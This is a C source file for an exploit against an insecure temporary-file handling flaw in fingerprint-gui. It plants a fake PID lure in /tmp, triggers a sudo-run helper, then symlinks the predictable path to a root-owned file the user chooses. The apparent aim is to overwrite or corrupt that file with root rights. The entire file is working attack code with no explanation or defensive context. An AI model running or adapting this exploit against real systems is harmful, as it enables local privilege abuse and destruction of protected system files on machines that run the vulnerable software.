// exploit for fingerprint-gui insecure tmp file
#include <fcntl.h>
#include <pwd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

int main(int argc, char *argv[])
{
	int i = 0, pid = 0, fd = 0;
	char pbuf[10];
	char *envp[] = { NULL };
	char *file = "/tmp/fingerprint-helper.pid";
	char *target = NULL;
	struct stat s;
	struct passwd *pwd = NULL;

	if(argv[1] == NULL) {
		printf("usage: ./fp-race <root owned file>\n");
		exit(1);
	}

	if((stat(file, &s)) != -1)
		unlink(file);

	if((pid = fork()) == 0) {
		i = execle("/bin/sleep", "sleep", "10", NULL, envp);
		if(!i) {
			perror("execle: ");
			exit(1);
		}
		printf("\n");
	}
	memset(pbuf, '\0', 10);
	snprintf(pbuf, 9, "%d", pid);

	fd = open(file, O_RDWR|O_CREAT,S_IWUSR);
	if(!fd) {
		perror("open: ");
		exit(1);
	}

	if((write(fd, pbuf, strlen(pbuf))) == 0) {
			perror("write: ");
			exit(1);
	}
	close(fd);

	if((pid = fork()) == 0) {
		if((execle("/usr/bin/sudo", "pawprint", "id", NULL, envp)) != 0) {
			perror("execle: ");
    		}
	}

	while(1) {
		if((fd = open(file, O_RDONLY)) == -1) {
			printf("[+] Lure no longer found. Triggering.\n"); sleep(1);
			target = argv[1];
			symlink(target, file);
			break;
		} else {
			printf("hmm\n");
			exit(1);
		}
	}
	close(fd);
	return 0;
}
